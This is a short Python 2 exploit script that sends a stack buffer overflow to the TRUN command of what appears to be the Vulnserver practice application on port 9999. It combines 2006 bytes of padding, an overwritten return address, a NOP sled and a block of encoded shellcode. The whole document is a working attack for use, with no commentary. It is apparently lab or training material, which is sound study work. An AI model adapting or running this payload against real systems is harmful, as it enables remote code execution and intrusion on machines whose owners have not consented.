#!/usr/bin/python
import socket
server = '172.30.0.30'
sport = 9999

prefix = 'A' * 2006
eip = '\xaf\x11\x50\x62'
nopsled = '\x90' * 32
exploit = (
"\xb8\xcc\xbe\x3e\x7d\xd9\xc8\xd9\x74\x24\xf4\x5b\x29" +
"\xc9\xb1\x52\x83\xc3\x04\x31\x43\x0e\x03\x8f\xb0\xdc" +
"\x88\xf3\x25\xa2\x73\x0b\xb6\xc3\xfa\xee\x87\xc3\x99" +
"\x7b\xb7\xf3\xea\x29\x34\x7f\xbe\xd9\xcf\x0d\x17\xee" +
"\x78\xbb\x41\xc1\x79\x90\xb2\x40\xfa\xeb\xe6\xa2\xc3" +
"\x23\xfb\xa3\x04\x59\xf6\xf1\xdd\x15\xa5\xe5\x6a\x63" +
"\x76\x8e\x21\x65\xfe\x73\xf1\x84\x2f\x22\x89\xde\xef" +
"\xc5\x5e\x6b\xa6\xdd\x83\x56\x70\x56\x77\x2c\x83\xbe" +
"\x49\xcd\x28\xff\x65\x3c\x30\x38\x41\xdf\x47\x30\xb1" +
"\x62\x50\x87\xcb\xb8\xd5\x13\x6b\x4a\x4d\xff\x8d\x9f" +
"\x08\x74\x81\x54\x5e\xd2\x86\x6b\xb3\x69\xb2\xe0\x32" +
"\xbd\x32\xb2\x10\x19\x1e\x60\x38\x38\xfa\xc7\x45\x5a" +
"\xa5\xb8\xe3\x11\x48\xac\x99\x78\x05\x01\x90\x82\xd5" +
"\x0d\xa3\xf1\xe7\x92\x1f\x9d\x4b\x5a\x86\x5a\xab\x71" +
"\x7e\xf4\x52\x7a\x7f\xdd\x90\x2e\x2f\x75\x30\x4f\xa4" +
"\x85\xbd\x9a\x6b\xd5\x11\x75\xcc\x85\xd1\x25\xa4\xcf" +
"\xdd\x1a\xd4\xf0\x37\x33\x7f\x0b\xd0\x90\x9e\x13\xe3" +
"\x81\x9c\x13\xf2\x0d\x28\xf5\x9e\xbd\x7c\xae\x36\x27" +
"\x25\x24\xa6\xa8\xf3\x41\xe8\x23\xf0\xb6\xa7\xc3\x7d" +
"\xa4\x50\x24\xc8\x96\xf7\x3b\xe6\xbe\x94\xae\x6d\x3e" +
"\xd2\xd2\x39\x69\xb3\x25\x30\xff\x29\x1f\xea\x1d\xb0" +
"\xf9\xd5\xa5\x6f\x3a\xdb\x24\xfd\x06\xff\x36\x3b\x86" +
"\xbb\x62\x93\xd1\x15\xdc\x55\x88\xd7\xb6\x0f\x67\xbe" +
"\x5e\xc9\x4b\x01\x18\xd6\x81\xf7\xc4\x67\x7c\x4e\xfb" +
"\x48\xe8\x46\x84\xb4\x88\xa9\x5f\x7d\xb8\xe3\xfd\xd4" +
"\x51\xaa\x94\x64\x3c\x4d\x43\xaa\x39\xce\x61\x53\xbe" +
"\xce\x00\x56\xfa\x48\xf9\x2a\x93\x3c\xfd\x99\x94\x14"
)
padding = 'F' * (3000 - 2006 - 4 - 32 - len(exploit))
attack = prefix + eip + nopsled + exploit + padding
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)
print "Sending attack to TRUN . with length ", len(attack)
s.send(('TRUN .' + attack + '\r\n'))
print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()

     
